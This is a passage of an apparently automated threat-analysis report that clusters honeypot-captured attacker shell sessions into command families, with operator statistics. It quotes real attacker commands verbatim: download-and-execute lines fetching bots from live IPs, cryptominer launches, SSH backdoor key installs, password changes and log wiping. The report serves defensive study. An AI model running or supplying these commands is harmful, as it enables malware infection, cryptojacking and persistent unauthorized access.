Medoid: `fi_hash=4e638d8ebbdeacac` (session `5a4ab81e84a3`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; rm -rf xmr*; pkill xmrig*; wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('rm', ';'), ('wget', '&&'), ('tar', '&&'), ('cd', '&&'), ('screen', ';'), ('PH_EXEC_2', 'EOS')]
```

Top operators: [('cd', 8), ('rm', 4), ('wget', 4), ('tar', 4), ('screen', 4), ('PH_EXEC_2', 4), ('kill', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 4e638d8ebbdeacac | 5a4ab81e84a3 |        1 |
| 7da9676e41aec22f | 9bff925451e9 |        1 |
| 9b2b93610f1c0dba | 9eefe178aa37 |        1 |
| be2cf647c057577f | ab1b0dd1e0c6 |        1 |

## Family 129

Size: **4**, mean_FS: **0.920**, sd_FS: **0.054**  
Medoid: `fi_hash=d4965bdeec420d0d` (session `05ec4082cc13`, n_rows=52)  

**Medoid commands (snippet):**

```bash
enable
system
shell
sh
linuxshell
cd /tmp; cd /dev; cd /mnt; cd /var; rm -rf sh; wget http://185.28.39.119/sh || curl -O http://185.28.39.119/sh || tftp 185.28.39.119 -c get sh || tftp -g -r sh 185.28.39.119; chmod 777 sh; ./sh root; rm -rf sh
echo rootsenpai
 ...
```

Consensus (op, conn) pairs:

```python
[('shell', ';'), ('sh', ';'), ('cd', ';'), ('rm', ';'), ('wget', '||'), ('curl', '||'), ('tftp', '||'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('rm', ';'), ('rm', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('rm', ';'), ('rm', 'EOS')]
```

Top operators: [('echo', 172), ('cd', 25), ('rm', 25), ('chmod', 12), ('tftp', 8), ('cat', 5), ('enable', 4), ('shell', 4), ('sh', 4), ('wget', 4)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0f26e17c997c6810 | 8c95e9b38a33 |       51 |
| 1f0107721dbb2a40 | 14a2ff4eea5f |       51 |
| 81d19dcc61d74115 | 28f9aca23992 |       52 |
| d4965bdeec420d0d | 05ec4082cc13 |       52 |

## Family 41

Size: **4**, mean_FS: **0.908**, sd_FS: **0.035**  
Medoid: `fi_hash=6ef92ddfce5d4c55` (session `00ffaadba4ad`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; cd /dev; cd /mnt; cd /var; rm -rf sh; wget http://45.85.190.242/sh || curl -O http://45.85.190.242/sh || tftp 45.85.190.242 -c get sh; tftp -g -r sh 45.85.190.242; chmod 777 sh; ./sh root; rm -rf sh
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('cd', ';'), ('cd', ';'), ('cd', ';'), ('rm', ';'), ('wget', '||'), ('curl', '||'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';')]
```

Top operators: [('cd', 16), ('rm', 8), ('tftp', 7), ('wget', 4), ('curl', 4), ('chmod', 4), ('PH_EXEC_1', 4), ('echo', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 3604dd841d3e21fa | 067b5362c7ce |        1 |
| 39edbd853d9ba478 | 00594bd9f885 |        1 |
| 6ef92ddfce5d4c55 | 00ffaadba4ad |        1 |
| 8d18d22693ba3d29 | c7af26075fd4 |        1 |

## Family 30

Size: **4**, mean_FS: **0.903**, sd_FS: **0.083**  
Medoid: `fi_hash=55c3a2c5eaad91eb` (session `b78f8ee8bde7`, n_rows=28)  

**Medoid commands (snippet):**

```bash
>/tmp/.l && cd /tmp/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld
>/var/.l && cd /var/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld
>/dev/.l && cd /dev/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x ...
```

Consensus (op, conn) pairs:

```python
[('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', ';'), ('chmod', ';')]
```

Top operators: [('echo', 139), ('>', 60), ('cd', 56), ('PH_EXEC_1', 43), ('chmod', 12), ('rm', 8), ('cp', 8), ('PH_EXEC_2', 4), ('PH_EXEC_3', 3), ('kill', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 55c3a2c5eaad91eb | b78f8ee8bde7 |       28 |
| a8119f6fd9245cc1 | 0290f5f3fec8 |       28 |
| cf097bde0465e135 | 0cbfacaac4cb |       28 |
| e3722713579aa2f2 | 0b6c9dcc122b |       26 |

## Family 79

Size: **4**, mean_FS: **0.889**, sd_FS: **0.047**  
Medoid: `fi_hash=b8f64da662b5b142` (session `1ec5c9894abc`, n_rows=17)  

**Medoid commands (snippet):**

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgT ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('whoami', ';'), ('lscpu', '|'), ('grep', ';'), ('df', '|'), ('head', '|'), ('awk', 'EOS')]
```

Top operators: [('grep', 21), ('cd', 12), ('awk', 12), ('uname', 12), ('echo', 9), ('cat', 9), ('head', 8), ('wc', 5), ('passwd', 5), ('chattr', 4)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 96c21036e1480ba9 | 6f594e151759 |       16 |
| b010f36a47be2c87 | 83e48c5c4ce5 |       18 |
| b8f64da662b5b142 | 1ec5c9894abc |       17 |
| d6733f481fdea8d6 | 00abc27aa1c4 |       19 |

## Family 3

Size: **4**, mean_FS: **0.883**, sd_FS: **0.117**  
Medoid: `fi_hash=5064ae55de1599db` (session `01ed4d5515c7`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp cd /var/run cd /mnt cd /root cd /; wget http://5.181.80.111/0x83911d24Fx.sh; curl -O http://5.181.80.111/0x83911d24Fx.sh; chmod 777 0x83911d24Fx.sh; sh 0x83911d24Fx.sh; tftp 5.181.80.111 -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';')]
```

Top operators: [('sh', 15), ('chmod', 12), ('rm', 8), ('tftp', 7), ('cd', 4), ('wget', 4), ('curl', 4), ('ftpget', 3), ('history', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5064ae55de1599db | 01ed4d5515c7 |        1 |
| 97a0b32c644e5183 | 8a59babb0486 |        1 |
| adf8567a6e21f1cb | 27ee02b2908c |        1 |
| ce81a8f368bbec00 | 00f5f78d5f59 |        1 |

## Family 12

Size: **4**, mean_FS: **0.880**, sd_FS: **0.087**  
Medoid: `fi_hash=91ef7e27209d3e26` (session `073aed28218a`, n_rows=5)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
echo -e '\\x72\\x70\\x70\\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag
echo -e '\\x4d\\x4f\\x55\\x4e\\x54\\x53\\x5f\\x44\\x4f\\x4e\\x45'
rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp  ...
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('echo', ';'), ('cat', ';'), ('rm', ';'), ('echo', ';'), ('rm', ';'), ('rm', ';'), ('>', ';'), ('chmod', '||'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 18), ('rm', 12), ('cat', 10), ('>', 9), ('cp', 8), ('chmod', 4), ('wget', 4), ('curl', 3), ('cd', 1), ('PH_EXEC_1', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 8b3339de1a60aae0 | 7e023c5f696c |        6 |
| 91ef7e27209d3e26 | 073aed28218a |        5 |
| 981ab5c8216bd964 | 046278d95bad |        5 |
| f7f99816e8b68be2 | 001bb731fef4 |        6 |

## Family 10

Size: **4**, mean_FS: **0.849**, sd_FS: **0.091**  
Medoid: `fi_hash=52d28d86635cead9` (session `72c940efc277`, n_rows=12)  

**Medoid commands (snippet):**

```bash
cat /proc/mounts
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>//.a && cd /
>/proc/.a && cd /proc
>/dev/.a && cd /dev
wget --help; curl --help; ftpget --help; echo -e '\\x48\\x41\\x53\\ ...
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('ftpget', ';'), ('echo', ';')]
```

Top operators: [('>', 34), ('cd', 34), ('wget', 8), ('curl', 6), ('cat', 4), ('ftpget', 4), ('echo', 4), ('chmod', 2), ('PH_EXEC_1', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0465df4be181f6ef | 4cb8bb3bda60 |       11 |
| 52d28d86635cead9 | 72c940efc277 |       12 |
| 72588f0f80cad226 | 77235a6a3af6 |        9 |
| 7acc61b6f981020c | a62dc09dc77d |       12 |

## Family 2

Size: **4**, mean_FS: **0.836**, sd_FS: **0.089**  
Medoid: `fi_hash=19042055c078527f` (session `16aba74d69c6`, n_rows=17)  

**Medoid commands (snippet):**

```bash
cat /proc/cpuinfo | grep name | wc -l
echo -e "administrator\\nF6NJFSgZBIfU\\nF6NJFSgZBIfU" | passwd | bash
echo "administrator\\nF6NJFSgZBIfU\\nF6NJFSgZBIfU\\n" | passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }'
free -m | g ...
```

Consensus (op, conn) pairs:

```python
[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&')]
```

Top operators: [('grep', 24), ('echo', 16), ('cat', 14), ('uname', 12), ('cd', 9), ('wc', 8), ('passwd', 8), ('awk', 8), ('rm', 6), ('bash', 5)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 19042055c078527f | 16aba74d69c6 |       17 |
| 3d567a6d68c0fe53 | 4fc3eb715672 |       14 |
| 8a5304f4254a2f9a | 1997dc5f8d02 |       22 |
| dcba15d236cf3339 | 007597bf0aa3 |       16 |

## Family 1

Size: **4**, mean_FS: **0.811**, sd_FS: **0.081**  
Medoid: `fi_hash=23e7b07a5c28706f` (session `147794ebca10`, n_rows=4)  

**Medoid commands (snippet):**

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgT ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('df', '|'), ('head', '|'), ('awk', 'EOS')]
```

Top operators: [('cd', 12), ('chattr', 4), ('lockr', 4), ('rm', 4), ('mkdir', 4), ('echo', 4), ('chmod', 4), ('df', 4), ('head', 4), ('awk', 4)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 23e7b07a5c28706f | 147794ebca10 |        4 |
| a6d70dd4e6cf3b45 | 904b142f89ed |        8 |
| bfda422b56e10e38 | 4b8486f5dd54 |        5 |
| d2eec9730b64187e | 19ac17d6a3e2 |        3 |

## Family 5

Size: **4**, mean_FS: **0.806**, sd_FS: **0.070**  
Medoid: `fi_hash=9b3601b38f46edc9` (session `0035f8cc8883`, n_rows=4)  

**Medoid commands (snippet):**

```bash
ifconfig
uname -a
cat /proc/cpuinfo
echo Hi | cat -n
```

Consensus (op, conn) pairs:

```python
[('ifconfig', ';'), ('uname', ';'), ('echo', '|'), ('cat', 'EOS')]
```

Top operators: [('cat', 6), ('ifconfig', 4), ('uname', 4), ('echo', 4), ('ls', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9b3601b38f46edc9 | 0035f8cc8883 |        4 |
| c2b3760fe47a8182 | 30773037dc1a |        4 |
| c9f8e4d73f4a1ce2 | 5596277630bd |        3 |
| cd8eb7026cac0c24 | 025aa3075c4a |        5 |

## Family 44

Size: **3**, mean_FS: **0.933**, sd_FS: **0.000**  
Medoid: `fi_hash=02661ba640ad5dbe` (session `0ca5aa140689`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.172.157.131/bins/Zeus.x86; curl -O http://107.172.157.131/bins/Zeus.x86; cat Zeus.x86 >awoo; chmod +x *; ./awoo AutoRoot; >/var/log/lastlog; >/var/log/wtmp; >/var/log/btmp; history -c
```

Consensus (op, conn) pairs:

```python
[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('cat', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('>', ';'), ('>', ';'), ('>', ';'), ('history', 'EOS')]
```

Top operators: [('cd', 15), ('>', 9), ('wget', 3), ('curl', 3), ('cat', 3), ('chmod', 3), ('PH_EXEC_1', 3), ('history', 3), ('rm', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 02661ba640ad5dbe | 0ca5aa140689 |        1 |
| 6aec717e0bbe7a23 | 0326184d1fa1 |        1 |
| edc822b631f0e67e | 2cdcd50a4817 |        1 |

## Family 18

Size: **3**, mean_FS: **0.900**, sd_FS: **0.000**  
Medoid: `fi_hash=021cda85adade07c` (session `1474808cc7d5`, n_rows=1)  

**Medoid commands (snippet):**

```bash
rm -rf Ugliest.10wget; wget http://136.144.41.169/Ugliest.x86 -O Ugliest.10wget; chmod +x Ugliest.10wget; ./Ugliest.10wget x86.wget; rm -rf Ugliest.10wget
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', 'EOS')]
```

Top operators: [('rm', 4), ('wget', 3), ('chmod', 3), ('PH_EXEC_1', 3), ('cat', 1), ('cd', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 021cda85adade07c | 1474808cc7d5 |        1 |
| 0c34db04a905b224 | 0df0fbc8934e |        1 |
| 4f4dbe54050fe97d | 9928672b0ef2 |        1 |

## Family 47

Size: **3**, mean_FS: **0.897**, sd_FS: **0.036**  
Medoid: `fi_hash=a11161b6f8ad5156` (session `0717fcea4e17`, n_rows=5)  

**Medoid commands (snippet):**

```bash
echo -e '\\x79\\x65\\x73\\x68\\x65\\x6c\\x6f'
cat /bin/echo
cat /proc/mounts
cp /bin/echo //.f && >//.f && echo -e '\\x67\\x6f\\x6f\\x64\\x77\\x72\\x69\\x74\\x65' && chmod 777 //.f; echo -e '\\x63\\x6d\\x64\\x67\\x6f\\x74'
cd //; wget http://2.58.149.116/x86_6 ...
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('cat', ';'), ('cat', ';'), ('cp', '&&'), ('>', '&&'), ('echo', '&&'), ('chmod', ';'), ('echo', ';'), ('cd', ';'), ('wget', ';'), ('PH_EXEC_1', ';')]
```

Top operators: [('echo', 10), ('cat', 6), ('>', 6), ('cp', 3), ('chmod', 3), ('cd', 3), ('wget', 3), ('PH_EXEC_1', 3), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 06563cfd68e67617 | 00b4cedb2b50 |        5 |
| a11161b6f8ad5156 | 0717fcea4e17 |        5 |
| ec9975f17ad86555 | 237ccd35b162 |        5 |

## Family 66

Size: **3**, mean_FS: **0.895**, sd_FS: **0.074**  
Medoid: `fi_hash=6481beeb0d71411d` (session `2898c1f58141`, n_rows=9)  

**Medoid commands (snippet):**

```bash
>/home/.i && cd /home/; cp /bin/echo ntpclient; >ntpclient; chmod +x ntpclient
>/.i && cd /; cp /bin/echo ntpclient; >ntpclient; chmod +x ntpclient
>/tmp/.i && cd /tmp/; cp /bin/echo ntpclient; >ntpclient; chmod +x ntpclient
>/var/tmp/.i && cd /var/tmp/; cp /b ...
```

Consensus (op, conn) pairs:

```python
[('>', '&&'), ('cd', ';'), ('cp', ';'), ('>', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('>', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('>', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('>', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('>', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('>', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('>', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('cp', ';'), ('>', ';'), ('chmod', ';'), ('wget', ';'), ('PH_EXEC_1', ';'), ('>', 'EOS')]
```

Top operators: [('>', 51), ('cd', 24), ('cp', 24), ('chmod', 24), ('rm', 8), ('wget', 3), ('PH_EXEC_1', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 6481beeb0d71411d | 2898c1f58141 |        9 |
| 8d2157a843e85c11 | e7f94a166171 |        9 |
| cc904d86806f2889 | 0e8ae0259a88 |        9 |

## Family 8

Size: **3**, mean_FS: **0.833**, sd_FS: **0.000**  
Medoid: `fi_hash=1171bc0d72c7feb8` (session `07f9926fac95`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main
```

Consensus (op, conn) pairs:

```python
[('wget', '&&'), ('chmod', '&&')]
```

Top operators: [('wget', 3), ('chmod', 3), ('PH_EXEC_1', 1), ('bash', 1), ('PH_EXEC_2', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1171bc0d72c7feb8 | 07f9926fac95 |        1 |
| da6990cefeac708d | 42709a32cd24 |        1 |
| f997157753ed3b5c | 1aad4707c081 |        1 |

## Family 28

Size: **3**, mean_FS: **0.833**, sd_FS: **0.057**  
Medoid: `fi_hash=f7716de87b7f40be` (session `0047ee8b9fd9`, n_rows=2)  

**Medoid commands (snippet):**

```bash
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYm ...
```

Consensus (op, conn) pairs:

```python
[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('useradd', 'EOS')]
```

Top operators: [('chmod', 7), ('cd', 6), ('XBWk2DfaVCtdANvbugnv', 4), ('rm', 3), ('mkdir', 3), ('echo', 3), ('useradd', 3), ('crontab', 2), ('userdel', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 8900e317ed9dfd13 | 00451c286321 |        6 |
| dfc00c00617a91c7 | 0ad9fb2a0862 |        2 |
| f7716de87b7f40be | 0047ee8b9fd9 |        2 |

## Family 11

Size: **3**, mean_FS: **0.828**, sd_FS: **0.090**  
Medoid: `fi_hash=216f507843bd109b` (session `2111fc86da2a`, n_rows=10)  

**Medoid commands (snippet):**

```bash
>/home/.z && cd /home/; rm -rf .i; cp /bin/echo .i; >.i; cp .i .d; chmod 777 .i; chmod 777 .d
>/.z && cd /; rm -rf .i; cp /bin/echo .i; >.i; cp .i .d; chmod 777 .i; chmod 777 .d
>/tmp/.z && cd /tmp/; rm -rf .i; cp /bin/echo .i; >.i; cp .i .d; chmod 777 .i; chm ...
```

Consensus (op, conn) pairs:

```python
[('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('>', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';')]
```

Top operators: [('>', 50), ('cp', 48), ('chmod', 48), ('cd', 24), ('rm', 24), ('echo', 22), ('wget', 2), ('PH_EXEC_1', 2), ('PH_EXEC_2', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 216f507843bd109b | 2111fc86da2a |       10 |
| 5636d88237975756 | 1ee2eb702bc0 |        9 |
| dc55628a20cc62a8 | 3072822ce17d |       19 |

## Family 7

Size: **3**, mean_FS: **0.802**, sd_FS: **0.062**  
Medoid: `fi_hash=558db742ab5e52c3` (session `002829310866`, n_rows=2)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
wget --help>/dev/null && echo -en '\\x57\\x47\\x45\\x54'; curl --help>/dev/null && echo -en '\\x43\\x55\\x52\\x4c'; echo -en '\\x67\\x61\\x79\\x66\\x67\\x74'
```

Consensus (op, conn) pairs:

```python
[('wget', '&&'), ('echo', ';'), ('curl', '&&'), ('echo', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 9), ('cat', 3), ('wget', 3), ('curl', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1e1dcfe0d4b8470d | 4b7304de97c0 |        3 |
| 4ea9f78f994796e6 | 64bab984c453 |        1 |
| 558db742ab5e52c3 | 002829310866 |        2 |

## Family 0

Size: **3**, mean_FS: **0.778**, sd_FS: **0.079**  
Medoid: `fi_hash=dfe49ff2e4f687af` (session `1f8a03b6c7bc`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; wget http://185.16.39.239/letmethink.sh -O- | sh
```

Consensus (op, conn) pairs:

```python
[('sh', 'EOS')]
```

Top operators: [('wget', 3), ('sh', 3), ('cd', 2), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| b34f3cd5a8628705 | 8f6434c878f2 |        1 |
| c817debf27c42b8c | 008f6c000b6b |        2 |
| dfe49ff2e4f687af | 1f8a03b6c7bc |        1 |

## Family 121

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=057e20c2c81bb974` (session `01447d76af93`, n_rows=2)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
cat /proc/mounts
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('cat', 'EOS')]
```

Top operators: [('cat', 4)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 057e20c2c81bb974 | 01447d76af93 |        2 |
| 65a790f605fb522b | 5d1975aa55f5 |        2 |

## Family 74

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=0ad547dc997d261b` (session `41f32e1930c6`, n_rows=1)  

**Medoid commands (snippet):**

```bash
top -b -n1
```

Consensus (op, conn) pairs:

```python
[('top', 'EOS')]
```

Top operators: [('top', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0ad547dc997d261b | 41f32e1930c6 |        1 |
| c8465307b65e8ef2 | 003784a65dff |        1 |

## Family 160

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=1a5bacae56ee1ab9` (session `16ff8b2aef4b`, n_rows=1)  

**Medoid commands (snippet):**

```bash
curl -s http://18.188.207.128/bins.sh | bash
```

Consensus (op, conn) pairs:

```python
[('curl', '|'), ('bash', 'EOS')]
```

Top operators: [('curl', 2), ('bash', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1a5bacae56ee1ab9 | 16ff8b2aef4b |        1 |
| 1f56df1fa3bf1b7a | 02cdd85ddf5c |        1 |

## Family 166

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=32e217eef22aa399` (session `4d1ffcf3630c`, n_rows=1)  

**Medoid commands (snippet):**

```bash
